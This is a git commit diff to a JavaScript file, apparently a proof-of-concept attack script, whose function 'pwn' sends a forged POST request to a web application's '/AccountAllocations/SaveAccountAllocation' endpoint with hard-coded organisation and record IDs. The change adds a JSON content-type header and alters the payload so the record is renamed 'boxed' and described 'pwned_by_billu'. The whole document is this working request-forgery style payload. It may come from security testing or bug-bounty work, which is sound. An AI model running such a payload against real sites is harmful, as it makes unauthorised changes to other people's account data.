d3910556d1a6d81340e8f34b3b054f277d626d6e
Incredible <manish.1046@gmail.com>
2018-04-26 12:28:25 +0530

    Update r.js

--- r.js
+++ r.js
@@ -8,7 +8,8 @@ function pwn(){
   };
   xhttp.open("POST", "/AccountAllocations/SaveAccountAllocation", true);
   xhttp.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
-  var body = "{\"OrgId\":10530,\"AccountAllocationId\":61520,\"RangeId\":\"61822\",\"Name\":\"box\",\"Description\":\"box2\",\"RangeDeleted\":false,\"RangeFromDate\":\"04/23/2018\",\"RangeToDate\":\"12/31/9999\",\"RangeDetails\":\"\",\"FilterMode\":0,\"ShiftTypeIds\":\"\",\"LocationIds\":\"\",\"Action\":\"2\",\"Splits\":[{\"Name\":\"Master\",\"IsMaster\":true,\"AARS_ID\":\"61164\",\"WageCodes\":[],\"Details\":[{\"AARSD_ID\":62362,\"ACCD_ID\":1,\"Percent\":\"100\",\"IsDefault\":true}]}],\"AdHocCodes\":[],\"CustomACCD_ID\":-99999}"; 
+  xhttp.setRequestHeader('Content-Type', 'application/json');
+  var body = "{\"OrgId\":10530,\"AccountAllocationId\":61520,\"RangeId\":\"61822\",\"Name\":\"boxed\",\"Description\":\"pwned_by_billu\",\"RangeDeleted\":false,\"RangeFromDate\":\"04/23/2018\",\"RangeToDate\":\"12/31/9999\",\"RangeDetails\":\"\",\"FilterMode\":0,\"ShiftTypeIds\":\"\",\"LocationIds\":\"\",\"Action\":\"2\",\"Splits\":[{\"Name\":\"Master\",\"IsMaster\":true,\"AARS_ID\":\"61164\",\"WageCodes\":[],\"Details\":[{\"AARSD_ID\":62362,\"ACCD_ID\":1,\"Percent\":\"100\",\"IsDefault\":true}]}],\"AdHocCodes\":[],\"CustomACCD_ID\":-99999}"; 
         var aBody = new Uint8Array(body.length);
         for (var i = 0; i < aBody.length; i++)
           aBody[i] = body.charCodeAt(i); 
